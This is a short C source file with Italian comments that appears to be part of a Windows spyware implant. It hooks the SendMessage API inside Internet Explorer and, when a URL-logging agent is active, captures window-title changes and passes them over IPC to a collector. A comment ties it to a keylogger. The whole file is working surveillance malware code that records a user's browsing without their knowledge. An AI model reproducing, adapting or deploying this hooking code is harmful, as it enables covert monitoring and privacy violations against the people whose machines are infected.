#include <windows.h>
#include "Common.h"
#include "missing.h"
#include "Hooking.h"
#include "Url.h"

// -------------------------------- SendMessage -----------------------------------
LRESULT _stdcall H_SendMessageHook(void *data_param, 
								   HWND hWnd, 
								   UINT Msg, 
								   WPARAM wParam, 
								   LPARAM lParam)
{
	INIT_WRAPPER(H_SendMessage, LRESULT);
	CALL_ORIGINAL_API(hWnd, Msg, wParam, lParam);

	// Se fallisce ritorna...
	if (!ret_code)
		return ret_code;
	
	// Per il keylogger
	IF_ACTIVE_AGENT(PM_URLLOG) {
		if (Msg == WM_SETTEXT && pData->pIsWindow(hWnd)) 
			IPC_CLIENT_WRITE(PM_URLLOG, (BYTE *)&hWnd, 4, pData->browser_type | BROWSER_SETTITLE, IPC_DEF_PRIORITY);
	}

	return ret_code;
}

BOOL H_SendMessage_setup(H_SendMessageStruct *data)
{
	HMODULE hMod;

	// Hooka solo IE 64 bit
	if (!AmIThis(L"iexplore.exe"))
		return FALSE;

	VALIDPTR(hMod = GetModuleHandle("USER32.DLL"))
	VALIDPTR(data->pIsWindow = (IsWindow_t)GetProcAddress(hMod, "IsWindow"))
	data->browser_type = BROWSER_IE;

	return TRUE;
}
